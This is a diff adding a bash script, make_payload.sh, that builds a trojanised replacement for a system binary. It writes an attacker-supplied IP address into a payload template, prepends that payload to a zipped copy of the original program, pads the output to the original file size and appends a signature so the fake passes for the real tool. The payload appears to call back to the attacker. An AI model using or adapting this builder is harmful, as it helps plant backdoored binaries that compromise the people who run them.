@@ -1,0 +1,51 @@
+#!/bin/bash
+
+if [[ "$#" -ne 3 ]]; then
+    echo "Usage: make_payload.sh [TARGET] [OUTPUT] [ATTACKER IP]"
+    exit 1
+fi
+
+TARGET_FILE="$1"
+NEW_FILE_NAME="$2"
+ATTACKER_IP="$3"
+SIGNATURE='\x20\x24\x00\x00\xaa\xbb\xcc\xdd'
+FILE_PATH=$(which ${TARGET_FILE})
+FILE_SIZE=$(stat -c %s ${FILE_PATH})
+
+init() {
+    # remove the last build
+    rm -f ./${NEW_FILE_NAME}
+}
+
+append_after_file() {
+    SRC_FILE=$1
+    DST_FILE=$2
+    DIVIDER=$3
+    cat ${SRC_FILE} >> ${DST_FILE}
+    echo -e "\n---END OF ${DIVIDER}---" >> ${DST_FILE}
+}
+
+generate_payload() {
+    cp ./set_IP_payload ./payload
+    sed -i "s/SER_IP/${ATTACKER_IP}/g" ./payload
+}
+
+generate_new_file() {
+    rm -f ./${NEW_FILE_NAME}
+    zip ${TARGET_FILE}.zip ${FILE_PATH} &>/dev/null
+    append_after_file ./payload ./${NEW_FILE_NAME} PAYLOAD
+    append_after_file ./ls.zip ./${NEW_FILE_NAME} ORIGINAL
+    dd if=/dev/zero bs=1 \
+        count=$((${FILE_SIZE} - $(stat -c %s ./${NEW_FILE_NAME}) - 8)) >> ./${NEW_FILE_NAME} \
+        status=none
+    printf "%b" ${SIGNATURE} >> ./${NEW_FILE_NAME}
+}
+
+cleanup() {
+    rm -f ./payload ./ls.zip
+}
+
+init
+generate_payload
+generate_new_file
+cleanup
